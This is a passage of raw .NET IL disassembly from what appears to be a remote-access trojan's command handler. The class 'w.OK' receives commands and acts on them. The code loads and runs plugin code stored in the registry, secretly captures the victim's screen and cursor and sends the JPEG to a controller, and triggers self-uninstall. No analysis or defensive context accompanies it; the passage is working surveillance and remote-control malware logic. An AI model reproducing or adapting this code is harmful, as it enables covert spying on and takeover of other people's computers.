                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0ec3:  pop
      IL_0ec4:  nop
      IL_0ec5:  ldc.i4.5
      IL_0ec6:  newarr     [mscorlib]System.String
      IL_0ecb:  stloc.s    VB$t_array$S0
      IL_0ecd:  ldloc.s    VB$t_array$S0
      IL_0ecf:  ldc.i4.0
      IL_0ed0:  ldstr      "pl"
      IL_0ed5:  stelem.ref
      IL_0ed6:  nop
      IL_0ed7:  ldloc.s    VB$t_array$S0
      IL_0ed9:  ldc.i4.1
      IL_0eda:  ldsfld     string w.OK::Y
      IL_0edf:  stelem.ref
      IL_0ee0:  nop
      IL_0ee1:  ldloc.s    VB$t_array$S0
      IL_0ee3:  ldc.i4.2
      IL_0ee4:  ldloc.0
      IL_0ee5:  ldc.i4.1
      IL_0ee6:  ldelem.ref
      IL_0ee7:  stelem.ref
      IL_0ee8:  nop
      IL_0ee9:  ldloc.s    VB$t_array$S0
      IL_0eeb:  ldc.i4.3
      IL_0eec:  ldsfld     string w.OK::Y
      IL_0ef1:  stelem.ref
      IL_0ef2:  nop
      IL_0ef3:  ldloc.s    VB$t_array$S0
      IL_0ef5:  ldc.i4.4
      IL_0ef6:  ldc.i4.0
      IL_0ef7:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0efc:  stelem.ref
      IL_0efd:  nop
      IL_0efe:  ldloc.s    VB$t_array$S0
      IL_0f00:  call       string [mscorlib]System.String::Concat(string[])
      IL_0f05:  call       bool w.OK::Send(string)
      IL_0f0a:  pop
      IL_0f0b:  ldloc.s    t
      IL_0f0d:  ldstr      "A"
      IL_0f12:  call       object w.OK::Plugin(uint8[],
                                               string)
      IL_0f17:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0f1c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0f21:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0f26:  stloc.s    objectValue
      IL_0f28:  ldloc.s    objectValue
      IL_0f2a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0f2f:  ldnull
      IL_0f30:  ldstr      "h"
      IL_0f35:  ldc.i4.1
      IL_0f36:  newarr     [mscorlib]System.Object
      IL_0f3b:  stloc.s    VB$t_array$S2
      IL_0f3d:  ldloc.s    VB$t_array$S2
      IL_0f3f:  ldc.i4.0
      IL_0f40:  ldsfld     string w.OK::H
      IL_0f45:  stelem.ref
      IL_0f46:  nop
      IL_0f47:  ldloc.s    VB$t_array$S2
      IL_0f49:  ldnull
      IL_0f4a:  ldnull
      IL_0f4b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0f50:  nop
      IL_0f51:  ldloc.s    objectValue
      IL_0f53:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0f58:  ldnull
      IL_0f59:  ldstr      "p"
      IL_0f5e:  ldc.i4.1
      IL_0f5f:  newarr     [mscorlib]System.Object
      IL_0f64:  stloc.s    VB$t_array$S2
      IL_0f66:  ldloc.s    VB$t_array$S2
      IL_0f68:  ldc.i4.0
      IL_0f69:  ldsfld     string w.OK::P
      IL_0f6e:  stelem.ref
      IL_0f6f:  nop
      IL_0f70:  ldloc.s    VB$t_array$S2
      IL_0f72:  ldnull
      IL_0f73:  ldnull
      IL_0f74:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0f79:  nop
      IL_0f7a:  ldloc.s    objectValue
      IL_0f7c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0f81:  ldnull
      IL_0f82:  ldstr      "osk"
      IL_0f87:  ldc.i4.1
      IL_0f88:  newarr     [mscorlib]System.Object
      IL_0f8d:  stloc.s    VB$t_array$S2
      IL_0f8f:  ldloc.s    VB$t_array$S2
      IL_0f91:  ldc.i4.0
      IL_0f92:  ldloc.0
      IL_0f93:  ldc.i4.2
      IL_0f94:  ldelem.ref
      IL_0f95:  stelem.ref
      IL_0f96:  nop
      IL_0f97:  ldloc.s    VB$t_array$S2
      IL_0f99:  ldnull
      IL_0f9a:  ldnull
      IL_0f9b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0fa0:  nop
      IL_0fa1:  ldloc.s    objectValue
      IL_0fa3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0fa8:  ldnull
      IL_0fa9:  ldstr      "start"
      IL_0fae:  ldc.i4.0
      IL_0faf:  newarr     [mscorlib]System.Object
      IL_0fb4:  ldnull
      IL_0fb5:  ldnull
      IL_0fb6:  ldnull
      IL_0fb7:  ldc.i4.1
      IL_0fb8:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0fbd:  pop
      IL_0fbe:  br.s       IL_0fc8

      IL_0fc0:  ldc.i4.1
      IL_0fc1:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0fc6:  nop
      IL_0fc7:  nop
      IL_0fc8:  ldsfld     bool w.OK::Cn
      IL_0fcd:  ldc.i4.0
      IL_0fce:  ceq
      IL_0fd0:  box        [mscorlib]System.Boolean
      IL_0fd5:  ldloc.s    objectValue
      IL_0fd7:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0fdc:  ldnull
      IL_0fdd:  ldstr      "Off"
      IL_0fe2:  ldc.i4.0
      IL_0fe3:  newarr     [mscorlib]System.Object
      IL_0fe8:  ldnull
      IL_0fe9:  ldnull
      IL_0fea:  ldnull
      IL_0feb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0ff0:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0ff5:  ldc.i4.1
      IL_0ff6:  box        [mscorlib]System.Boolean
      IL_0ffb:  ldc.i4.0
      IL_0ffc:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_1001:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1006:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_100b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1010:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_1015:  ldc.i4.0
      IL_1016:  ceq
      IL_1018:  stloc.s    VB$CG$t_bool$S1
      IL_101a:  ldloc.s    VB$CG$t_bool$S1
      IL_101c:  brtrue.s   IL_0fc0

      IL_101e:  ldloc.s    objectValue
      IL_1020:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1025:  ldnull
      IL_1026:  ldstr      "off"
      IL_102b:  ldc.i4.1
      IL_102c:  newarr     [mscorlib]System.Object
      IL_1031:  stloc.s    VB$t_array$S2
      IL_1033:  ldloc.s    VB$t_array$S2
      IL_1035:  ldc.i4.0
      IL_1036:  ldc.i4.1
      IL_1037:  box        [mscorlib]System.Boolean
      IL_103c:  stelem.ref
      IL_103d:  nop
      IL_103e:  ldloc.s    VB$t_array$S2
      IL_1040:  ldnull
      IL_1041:  ldnull
      IL_1042:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1047:  nop
      IL_1048:  nop
      IL_1049:  nop
      IL_104a:  leave      IL_192e

      IL_104f:  br         IL_14ab

      IL_1054:  nop
      IL_1055:  ldloc.s    VB$t_string$L6
      IL_1057:  ldstr      "ret"
      IL_105c:  ldc.i4.0
      IL_105d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1062:  ldc.i4.0
      IL_1063:  ceq
      IL_1065:  stloc.s    VB$CG$t_bool$S1
      IL_1067:  ldloc.s    VB$CG$t_bool$S1
      IL_1069:  brfalse    IL_1228

      IL_106e:  nop
      IL_106f:  ldloc.0
      IL_1070:  ldc.i4.1
      IL_1071:  ldelem.ref
      IL_1072:  ldc.i4.0
      IL_1073:  newarr     [mscorlib]System.Byte
      IL_1078:  call       object w.OK::GTV(string,
                                            object)
      IL_107d:  castclass  uint8[]
      IL_1082:  stloc.s    buffer3
      IL_1084:  ldloc.0
      IL_1085:  ldc.i4.2
      IL_1086:  ldelem.ref
      IL_1087:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_108c:  ldc.i4.s   10
      IL_108e:  clt
      IL_1090:  ldloc.s    buffer3
      IL_1092:  ldlen
      IL_1093:  conv.ovf.i4
      IL_1094:  ldc.i4.0
      IL_1095:  ceq
      IL_1097:  and
      IL_1098:  stloc.s    VB$CG$t_bool$S1
      IL_109a:  ldloc.s    VB$CG$t_bool$S1
      IL_109c:  brfalse.s  IL_10e9

      IL_109e:  ldc.i4.5
      IL_109f:  newarr     [mscorlib]System.String
      IL_10a4:  stloc.s    VB$t_array$S0
      IL_10a6:  ldloc.s    VB$t_array$S0
      IL_10a8:  ldc.i4.0
      IL_10a9:  ldstr      "pl"
      IL_10ae:  stelem.ref
      IL_10af:  nop
      IL_10b0:  ldloc.s    VB$t_array$S0
      IL_10b2:  ldc.i4.1
      IL_10b3:  ldsfld     string w.OK::Y
      IL_10b8:  stelem.ref
      IL_10b9:  nop
      IL_10ba:  ldloc.s    VB$t_array$S0
      IL_10bc:  ldc.i4.2
      IL_10bd:  ldloc.0
      IL_10be:  ldc.i4.1
      IL_10bf:  ldelem.ref
      IL_10c0:  stelem.ref
      IL_10c1:  nop
      IL_10c2:  ldloc.s    VB$t_array$S0
      IL_10c4:  ldc.i4.3
      IL_10c5:  ldsfld     string w.OK::Y
      IL_10ca:  stelem.ref
      IL_10cb:  nop
      IL_10cc:  ldloc.s    VB$t_array$S0
      IL_10ce:  ldc.i4.4
      IL_10cf:  ldc.i4.1
      IL_10d0:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_10d5:  stelem.ref
      IL_10d6:  nop
      IL_10d7:  ldloc.s    VB$t_array$S0
      IL_10d9:  call       string [mscorlib]System.String::Concat(string[])
      IL_10de:  call       bool w.OK::Send(string)
      IL_10e3:  pop
      IL_10e4:  br         IL_121c

      IL_10e9:  nop
      IL_10ea:  ldloc.0
      IL_10eb:  ldc.i4.2
      IL_10ec:  ldelem.ref
      IL_10ed:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_10f2:  ldc.i4.s   10
      IL_10f4:  cgt
      IL_10f6:  stloc.s    VB$CG$t_bool$S1
      IL_10f8:  ldloc.s    VB$CG$t_bool$S1
      IL_10fa:  brfalse.s  IL_114a

      IL_10fc:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_1101:  stloc.s    stream3
      IL_1103:  ldloc.0
      IL_1104:  ldc.i4.0
      IL_1105:  ldelem.ref
      IL_1106:  ldsfld     string w.OK::Y
      IL_110b:  ldloc.0
      IL_110c:  ldc.i4.1
      IL_110d:  ldelem.ref
      IL_110e:  ldsfld     string w.OK::Y
      IL_1113:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_1118:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_111d:  stloc.s    num3
      IL_111f:  ldloc.s    stream3
      IL_1121:  ldarg.0
      IL_1122:  ldloc.s    num3
      IL_1124:  ldarg.0
      IL_1125:  ldlen
      IL_1126:  conv.ovf.i4
      IL_1127:  ldloc.s    num3
      IL_1129:  sub.ovf
      IL_112a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_112f:  nop
      IL_1130:  ldloc.s    stream3
      IL_1132:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1137:  call       uint8[] w.OK::ZIP(uint8[])
      IL_113c:  stloc.s    buffer3
      IL_113e:  ldloc.0
      IL_113f:  ldc.i4.1
      IL_1140:  ldelem.ref
      IL_1141:  ldloc.s    buffer3
      IL_1143:  ldc.i4.3
      IL_1144:  call       bool w.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_1149:  pop
      IL_114a:  nop
      IL_114b:  ldc.i4.5
      IL_114c:  newarr     [mscorlib]System.String
      IL_1151:  stloc.s    VB$t_array$S0
      IL_1153:  ldloc.s    VB$t_array$S0
      IL_1155:  ldc.i4.0
      IL_1156:  ldstr      "pl"
      IL_115b:  stelem.ref
      IL_115c:  nop
      IL_115d:  ldloc.s    VB$t_array$S0
      IL_115f:  ldc.i4.1
      IL_1160:  ldsfld     string w.OK::Y
      IL_1165:  stelem.ref
      IL_1166:  nop
      IL_1167:  ldloc.s    VB$t_array$S0
      IL_1169:  ldc.i4.2
      IL_116a:  ldloc.0
      IL_116b:  ldc.i4.1
      IL_116c:  ldelem.ref
      IL_116d:  stelem.ref
      IL_116e:  nop
      IL_116f:  ldloc.s    VB$t_array$S0
      IL_1171:  ldc.i4.3
      IL_1172:  ldsfld     string w.OK::Y
      IL_1177:  stelem.ref
      IL_1178:  nop
      IL_1179:  ldloc.s    VB$t_array$S0
      IL_117b:  ldc.i4.4
      IL_117c:  ldc.i4.0
      IL_117d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1182:  stelem.ref
      IL_1183:  nop
      IL_1184:  ldloc.s    VB$t_array$S0
      IL_1186:  call       string [mscorlib]System.String::Concat(string[])
      IL_118b:  call       bool w.OK::Send(string)
      IL_1190:  pop
      IL_1191:  ldloc.s    buffer3
      IL_1193:  ldstr      "A"
      IL_1198:  call       object w.OK::Plugin(uint8[],
                                               string)
      IL_119d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_11a2:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_11a7:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_11ac:  stloc.s    'instance'
      IL_11ae:  ldc.i4.5
      IL_11af:  newarr     [mscorlib]System.String
      IL_11b4:  stloc.s    VB$t_array$S0
      IL_11b6:  ldloc.s    VB$t_array$S0
      IL_11b8:  ldc.i4.0
      IL_11b9:  ldstr      "ret"
      IL_11be:  stelem.ref
      IL_11bf:  nop
      IL_11c0:  ldloc.s    VB$t_array$S0
      IL_11c2:  ldc.i4.1
      IL_11c3:  ldsfld     string w.OK::Y
      IL_11c8:  stelem.ref
      IL_11c9:  nop
      IL_11ca:  ldloc.s    VB$t_array$S0
      IL_11cc:  ldc.i4.2
      IL_11cd:  ldloc.0
      IL_11ce:  ldc.i4.1
      IL_11cf:  ldelem.ref
      IL_11d0:  stelem.ref
      IL_11d1:  nop
      IL_11d2:  ldloc.s    VB$t_array$S0
      IL_11d4:  ldc.i4.3
      IL_11d5:  ldsfld     string w.OK::Y
      IL_11da:  stelem.ref
      IL_11db:  nop
      IL_11dc:  ldloc.s    VB$t_array$S0
      IL_11de:  ldc.i4.4
      IL_11df:  ldloc.s    'instance'
      IL_11e1:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_11e6:  ldnull
      IL_11e7:  ldstr      "GT"
      IL_11ec:  ldc.i4.0
      IL_11ed:  newarr     [mscorlib]System.Object
      IL_11f2:  ldnull
      IL_11f3:  ldnull
      IL_11f4:  ldnull
      IL_11f5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_11fa:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_11ff:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_1204:  stloc.s    VB$t_string$S4
      IL_1206:  ldloca.s   VB$t_string$S4
      IL_1208:  call       string w.OK::ENB(string&)
      IL_120d:  stelem.ref
      IL_120e:  nop
      IL_120f:  ldloc.s    VB$t_array$S0
      IL_1211:  call       string [mscorlib]System.String::Concat(string[])
      IL_1216:  call       bool w.OK::Send(string)
      IL_121b:  pop
      IL_121c:  nop
      IL_121d:  nop
      IL_121e:  leave      IL_192e

      IL_1223:  br         IL_14ab

      IL_1228:  nop
      IL_1229:  ldloc.s    VB$t_string$L6
      IL_122b:  ldstr      "CAP"
      IL_1230:  ldc.i4.0
      IL_1231:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1236:  ldc.i4.0
      IL_1237:  ceq
      IL_1239:  stloc.s    VB$CG$t_bool$S1
      IL_123b:  ldloc.s    VB$CG$t_bool$S1
      IL_123d:  brfalse    IL_13fe

      IL_1242:  nop
      IL_1243:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1248:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_124d:  stloc.s    bounds
      IL_124f:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1254:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1259:  stloc.s    VB$t_struct$S3
      IL_125b:  ldloca.s   VB$t_struct$S3
      IL_125d:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_1262:  ldloca.s   bounds
      IL_1264:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_1269:  ldc.i4     0x21005
      IL_126e:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32,
                                                                                      valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
      IL_1273:  stloc.s    image
      IL_1275:  ldloc.s    image
      IL_1277:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_127c:  stloc.s    g
      IL_127e:  ldloca.s   blockRegionSize
      IL_1280:  ldloc.s    image
      IL_1282:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_1287:  ldloc.s    image
      IL_1289:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_128e:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_1293:  nop
      IL_1294:  ldloc.s    g
      IL_1296:  ldc.i4.0
      IL_1297:  ldc.i4.0
      IL_1298:  ldc.i4.0
      IL_1299:  ldc.i4.0
      IL_129a:  ldloc.s    blockRegionSize
      IL_129c:  ldc.i4     0xcc0020
      IL_12a1:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      IL_12a6:  nop
      IL_12a7:  nop
      .try
      {
        IL_12a8:  ldloca.s   blockRegionSize
        IL_12aa:  ldc.i4.s   32
        IL_12ac:  ldc.i4.s   32
        IL_12ae:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_12b3:  nop
        IL_12b4:  ldloca.s   bounds
        IL_12b6:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_12bb:  ldloc.s    blockRegionSize
        IL_12bd:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_12c2:  nop
        IL_12c3:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_12c8:  ldloc.s    g
        IL_12ca:  ldloc.s    bounds
        IL_12cc:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_12d1:  nop
        IL_12d2:  leave.s    IL_12e4

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_12d4:  dup
        IL_12d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_12da:  stloc.s    exception12
        IL_12dc:  nop
        IL_12dd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_12e2:  leave.s    IL_12e4

      }  // end handler
      IL_12e4:  nop
      IL_12e5:  ldloc.s    g
      IL_12e7:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_12ec:  nop
      IL_12ed:  ldloc.0
      IL_12ee:  ldc.i4.1
      IL_12ef:  ldelem.ref
      IL_12f0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_12f5:  ldloc.0
      IL_12f6:  ldc.i4.2
      IL_12f7:  ldelem.ref
      IL_12f8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_12fd:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_1302:  stloc.s    bitmap2
      IL_1304:  ldloc.s    bitmap2
      IL_1306:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_130b:  stloc.s    g
      IL_130d:  ldloc.s    g
      IL_130f:  ldloc.s    image
      IL_1311:  ldc.i4.0
      IL_1312:  ldc.i4.0
      IL_1313:  ldloc.s    bitmap2
      IL_1315:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_131a:  ldloc.s    bitmap2
      IL_131c:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_1321:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawImage(class [System.Drawing]System.Drawing.Image,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32)
      IL_1326:  nop
      IL_1327:  ldloc.s    g
      IL_1329:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_132e:  nop
      IL_132f:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_1334:  stloc.s    stream4
      IL_1336:  ldstr      "CAP"
      IL_133b:  ldsfld     string w.OK::Y
      IL_1340:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_1345:  stloc.s    VB$t_string$S4
      IL_1347:  ldloca.s   VB$t_string$S4
      IL_1349:  call       uint8[] w.OK::SB(string&)
      IL_134e:  starg.s    b
      IL_1350:  ldloc.s    stream4
      IL_1352:  ldarg.0
      IL_1353:  ldc.i4.0
      IL_1354:  ldarg.0
      IL_1355:  ldlen
      IL_1356:  conv.ovf.i4
      IL_1357:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_135c:  nop
      IL_135d:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_1362:  stloc.s    stream5
      IL_1364:  ldloc.s    bitmap2
      IL_1366:  ldloc.s    stream5
      IL_1368:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_136d:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_1372:  nop
      IL_1373:  ldloc.s    stream5
      IL_1375:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_137a:  call       string w.OK::md5(uint8[])
      IL_137f:  stloc.s    str2
      IL_1381:  ldloc.s    str2
      IL_1383:  ldsfld     string w.OK::lastcap
      IL_1388:  ldc.i4.0
      IL_1389:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_138e:  ldc.i4.0
      IL_138f:  ceq
      IL_1391:  ldc.i4.0
      IL_1392:  ceq
      IL_1394:  stloc.s    VB$CG$t_bool$S1
      IL_1396:  ldloc.s    VB$CG$t_bool$S1
      IL_1398:  brfalse.s  IL_13bb

      IL_139a:  ldloc.s    str2
      IL_139c:  stsfld     string w.OK::lastcap
      IL_13a1:  ldloc.s    stream4
      IL_13a3:  ldloc.s    stream5
      IL_13a5:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_13aa:  ldc.i4.0
      IL_13ab:  ldloc.s    stream5
      IL_13ad:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_13b2:  conv.ovf.i4
      IL_13b3:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_13b8:  nop
      IL_13b9:  br.s       IL_13c5

      IL_13bb:  nop
      IL_13bc:  ldloc.s    stream4
      IL_13be:  ldc.i4.0
      IL_13bf:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
      IL_13c4:  nop
      IL_13c5:  nop
      IL_13c6:  ldloc.s    stream4
      IL_13c8:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_13cd:  call       bool w.OK::Sendb(uint8[])
      IL_13d2:  pop
      IL_13d3:  ldloc.s    stream4
      IL_13d5:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_13da:  nop
      IL_13db:  ldloc.s    stream5
      IL_13dd:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_13e2:  nop
      IL_13e3:  ldloc.s    image
      IL_13e5:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_13ea:  nop
      IL_13eb:  ldloc.s    bitmap2
      IL_13ed:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_13f2:  nop
      IL_13f3:  nop
      IL_13f4:  leave      IL_192e

      IL_13f9:  br         IL_14ab

      IL_13fe:  nop
      IL_13ff:  ldloc.s    VB$t_string$L6
      IL_1401:  ldstr      "un"
      IL_1406:  ldc.i4.0
      IL_1407:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_140c:  ldc.i4.0
      IL_140d:  ceq
      IL_140f:  stloc.s    VB$CG$t_bool$S1
      IL_1411:  ldloc.s    VB$CG$t_bool$S1
      IL_1413:  brfalse    IL_14ab

      IL_1418:  nop
      IL_1419:  nop
      IL_141a:  ldloc.0
      IL_141b:  ldc.i4.1
      IL_141c:  ldelem.ref
      IL_141d:  stloc.s    VB$t_string$L7
      IL_141f:  nop
      IL_1420:  ldloc.s    VB$t_string$L7
      IL_1422:  ldstr      "~"
      IL_1427:  ldc.i4.0
      IL_1428:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_142d:  ldc.i4.0
      IL_142e:  ceq
      IL_1430:  stloc.s    VB$CG$t_bool$S0
      IL_1432:  ldloc.s    VB$CG$t_bool$S0
      IL_1434:  brfalse.s  IL_1442

      IL_1436:  nop
      IL_1437:  call       void w.OK::UNS()
      IL_143c:  nop
      IL_143d:  nop
      IL_143e:  br.s       IL_14a4

      IL_1440:  br.s       IL_14a4

      IL_1442:  nop
